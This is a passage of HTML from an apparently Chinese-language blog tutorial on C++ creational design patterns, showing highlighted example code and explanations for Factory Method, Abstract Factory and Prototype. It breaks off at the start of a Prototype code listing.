Creator</span><br><span class="hljs-comment"> * contains the implementation for all of the methods</span><br><span class="hljs-comment"> * to manipulate products except for the factory method</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Creator</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Creator() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> Product* <span class="hljs-title">createProductA</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> Product* <span class="hljs-title">createProductB</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">removeProduct</span><span class="hljs-params">( Product *product )</span> </span>= <span class="hljs-number">0</span>;<br>  <br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete Creator</span><br><span class="hljs-comment"> * implements factory method that is responsible for creating</span><br><span class="hljs-comment"> * one or more concrete products ie. it is class that has</span><br><span class="hljs-comment"> * the knowledge of how to create the products</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteCreator</span> :</span> <span class="hljs-keyword">public</span> Creator<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteCreator() &#123;&#125;<br>  <br>  <span class="hljs-function">Product* <span class="hljs-title">createProductA</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ConcreteProductA();<br>  &#125;<br>  <br>  <span class="hljs-function">Product* <span class="hljs-title">createProductB</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ConcreteProductB();<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">removeProduct</span><span class="hljs-params">( Product *product )</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">delete</span> product;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  Creator *creator = <span class="hljs-keyword">new</span> ConcreteCreator();<br>  <br>  Product *p1 = creator-&gt;createProductA();<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Product: "</span> &lt;&lt; p1-&gt;getName() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  creator-&gt;removeProduct( p1 );<br>  <br>  Product *p2 = creator-&gt;createProductB();<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Product: "</span> &lt;&lt; p2-&gt;getName() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  creator-&gt;removeProduct( p2 );<br>  <br>  <span class="hljs-keyword">delete</span> creator;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>以上代码的 creator将不同创建方法整合到一个类中。也可以按照示例1的方法，creator转化为不同的子类。</p><h3><span id="abstract-factory">Abstract Factory</span></h3><p>类似FactoryMethod的作用，不过需要创建的对象是“一系列相互关联的对象”。这个时候，将这一系列对象的创建，汇集到一个工厂类中。</p><h4><span id="示例2">示例2</span></h4><p>实现一个可以使用不同的数据库的类，可进行数据库的连接、SQL语句执行。</p><p>实现一，根据不同功能，建立不同的工厂。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//Connection基类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IDBConnection</span>&#123;</span>...&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IDBConnectionFactory</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> IDBConnection* <span class="hljs-title">CreateDBConnection</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>&#125;;<br><span class="hljs-comment">//Command基类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IDBCommand</span>&#123;</span>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IDBCommandFactory</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> IDBCommand* <span class="hljs-title">CreateDBCommand</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>&#125;;<br><span class="hljs-comment">//Reader基类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IDataReader</span>&#123;</span>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IDataReaderFactory</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> IDataReader* <span class="hljs-title">CreateDataReader</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-comment">//SQL数据库类工厂 3 个</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SqlConnection</span>:</span> <span class="hljs-keyword">public</span> IDBConnection&#123;&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SqlConnectionFactory</span>:</span><span class="hljs-keyword">public</span> IDBConnectionFactory&#123;&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SqlCommand</span>:</span> <span class="hljs-keyword">public</span> IDBCommand&#123;&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SqlCommandFactory</span>:</span><span class="hljs-keyword">public</span> IDBCommandFactory&#123;&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SqlDataReader</span>:</span> <span class="hljs-keyword">public</span> IDataReader&#123;&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SqlDataReaderFactory</span>:</span><span class="hljs-keyword">public</span> IDataReaderFactory&#123;&#125;;<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 使用3个工厂</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EmployeeDAO</span>&#123;</span><br>    IDBConnectionFactory* dbConnectionFactory;<br>    IDBCommandFactory* dbCommandFactory;<br>    IDataReaderFactory* dataReaderFactory;<br>    <br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// 构造函数传入Factory指针</span><br>    ...<br>    <br>    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;EmployeeDO&gt; <span class="hljs-title">GetEmployees</span><span class="hljs-params">()</span></span>&#123;<br>        IDBConnection* connection = dbConnectionFactory-&gt;CreateDBConnection();<br>        connection-&gt;ConnectionString(<span class="hljs-string">"..."</span>);<br><br>        IDBCommand* command = dbCommandFactory-&gt;CreateDBCommand();<br>        command-&gt;CommandText(<span class="hljs-string">"..."</span>);<br>        command-&gt;SetConnection(connection); <span class="hljs-comment">//关联性,使用connection</span><br><br>        IDBDataReader* reader = command-&gt;ExecuteReader();<br>        <span class="hljs-keyword">while</span> (reader-&gt;Read())&#123;...&#125;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>以上代码，除了不够简洁，还有可能传入不匹配的 Connection 对象和Command 对象（比如 SQL的Connection 和 MongoDB的Command）。</p><p>实现二，使用一个工厂，完成对象创建。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//数据库访问有关的基类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IDBConnection</span>&#123;</span>...&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IDBCommand</span>&#123;</span>...&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IDataReader</span>&#123;</span>...&#125;;<br><br><span class="hljs-comment">// Factory基类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IDBFactory</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    ...<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> IDBConnection* <span class="hljs-title">CreateDBConnection</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> IDBCommand* <span class="hljs-title">CreateDBCommand</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> IDataReader* <span class="hljs-title">CreateDataReader</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    ...<br>&#125;;<br><br><span class="hljs-comment">// SQL数据库的相关类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SqlConnection</span>:</span> <span class="hljs-keyword">public</span> IDBConnection&#123;...&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SqlCommand</span>:</span> <span class="hljs-keyword">public</span> IDBCommand&#123;...&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SqlDataReader</span>:</span> <span class="hljs-keyword">public</span> IDataReader&#123;...&#125;;<br><br><span class="hljs-comment">// SQL数据库各个相关类的创建工厂</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SqlDBFactory</span>:</span><span class="hljs-keyword">public</span> IDBFactory&#123;<br><span class="hljs-keyword">public</span>:<br>    ...<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> IDBConnection* <span class="hljs-title">CreateDBConnection</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> IDBCommand* <span class="hljs-title">CreateDBCommand</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> IDataReader* <span class="hljs-title">CreateDataReader</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br> ...<br>&#125;;<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EmployeeDAO</span>&#123;</span><br>    IDBFactory* dbFactory;<br>    <br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;EmployeeDO&gt; <span class="hljs-title">GetEmployees</span><span class="hljs-params">()</span></span>&#123;<br>        IDBConnection* connection = dbFactory-&gt;CreateDBConnection();<br>        connection-&gt;ConnectionString(<span class="hljs-string">"..."</span>);<br><br>        IDBCommand* command = dbFactory-&gt;CreateDBCommand();<br>        command-&gt;CommandText(<span class="hljs-string">"..."</span>);<br>        command-&gt;SetConnection(connection);<br><br>        IDBDataReader* reader = command-&gt;ExecuteReader();<br>        <span class="hljs-keyword">while</span> (reader-&gt;Read())&#123;...&#125;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>使用一个类管理相关对象的创建。AbstractFactory模式主要在于应对“新系列”的需求变动。其缺点在于难以应对“新对象”的需求变动，这就是FactoryMethod的事情了。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/24/21-13-00-9a030c.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><h4><span id="抽象代码结构">抽象代码结构</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Product A</span><br><span class="hljs-comment"> * products implement the same interface so that the classes can refer</span><br><span class="hljs-comment"> * to the interface not the concrete product</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProductA</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~ProductA() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ConcreteProductAX and ConcreteProductAY</span><br><span class="hljs-comment"> * define objects to be created by concrete factory</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteProductAX</span> :</span> <span class="hljs-keyword">public</span> ProductA<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteProductAX() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* <span class="hljs-title">getName</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">"A-X"</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteProductAY</span> :</span> <span class="hljs-keyword">public</span> ProductA<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteProductAY() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* <span class="hljs-title">getName</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">"A-Y"</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Product B</span><br><span class="hljs-comment"> * same as Product A, Product B declares interface for concrete products</span><br><span class="hljs-comment"> * where each can produce an entire set of products</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProductB</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~ProductB() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ConcreteProductBX and ConcreteProductBY</span><br><span class="hljs-comment"> * same as previous concrete product classes</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteProductBX</span> :</span> <span class="hljs-keyword">public</span> ProductB<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteProductBX() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* <span class="hljs-title">getName</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">"B-X"</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteProductBY</span> :</span> <span class="hljs-keyword">public</span> ProductB<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteProductBY() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* <span class="hljs-title">getName</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">"B-Y"</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Abstract Factory</span><br><span class="hljs-comment"> * provides an abstract interface for creating a family of products</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractFactory</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~AbstractFactory() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> ProductA *<span class="hljs-title">createProductA</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> ProductB *<span class="hljs-title">createProductB</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete Factory X and Y</span><br><span class="hljs-comment"> * each concrete factory create a family of products and client uses</span><br><span class="hljs-comment"> * one of these factories so it never has to instantiate a product object</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteFactoryX</span> :</span> <span class="hljs-keyword">public</span> AbstractFactory<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteFactoryX() &#123;&#125;<br>  <br>  <span class="hljs-function">ProductA *<span class="hljs-title">createProductA</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ConcreteProductAX();<br>  &#125;<br>  <span class="hljs-function">ProductB *<span class="hljs-title">createProductB</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ConcreteProductBX();<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteFactoryY</span> :</span> <span class="hljs-keyword">public</span> AbstractFactory<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteFactoryY() &#123;&#125;<br><br>  <span class="hljs-function">ProductA *<span class="hljs-title">createProductA</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ConcreteProductAY();<br>  &#125;<br>  <span class="hljs-function">ProductB *<span class="hljs-title">createProductB</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ConcreteProductBY();<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  ConcreteFactoryX *factoryX = <span class="hljs-keyword">new</span> ConcreteFactoryX();<br>  ConcreteFactoryY *factoryY = <span class="hljs-keyword">new</span> ConcreteFactoryY();<br><br>  ProductA *p1 = factoryX-&gt;createProductA();<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Product: "</span> &lt;&lt; p1-&gt;getName() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  <br>  ProductA *p2 = factoryY-&gt;createProductA();<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Product: "</span> &lt;&lt; p2-&gt;getName() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  <br>  <span class="hljs-keyword">delete</span> p1;<br>  <span class="hljs-keyword">delete</span> p2;<br>  <br>  <span class="hljs-keyword">delete</span> factoryX;<br>  <span class="hljs-keyword">delete</span> factoryY;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>结构和示例2稍有不同。</p><h3><span id="prototype">Prototype</span></h3><p>和FactoryMethod一样，用于创造对象，但是是通过拷贝原型来创建对象。类的拷贝构造函数需要指定正确。拷贝指的是深拷贝。</p><p>和FactoryMethod不同的是，Prototype更关注对象初始状态的变化，可以创建几种不同的状态的原型，供程序使用。</p><h4><span id="示例3">示例3</span></h4><p>示例和Factory Method一样，在FactoryMethod基础上做了改动，变成Prototype模式。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//将抽象类和工厂基类合并为一个类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISplitter</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">split</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> ISplitter* <span class="hljs-title">clone</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>; <span class="hljs-comment">//通过克隆自己来创建对象</span><br>    <span class="hljs-keyword">virtual</span> ~ISplitter()&#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">//具体类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BinarySplitter</span> :</span> <span class="hljs-keyword">public</span> ISplitter&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> ISplitter* <span class="hljs-title">clone</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> BinarySplitter(*<span class="hljs-keyword">this</span>);  <span class="hljs-comment">//通过克隆自己来创建对象</span><br>    &#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TxtSplitter</span>:</span> <span class="hljs-keyword">public</span> ISplitter&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> ISplitter* <span class="hljs-title">clone</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TxtSplitter(*<span class="hljs-keyword">this</span>);  <span class="hljs-comment">//通过克隆自己来创建对象</span><br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td 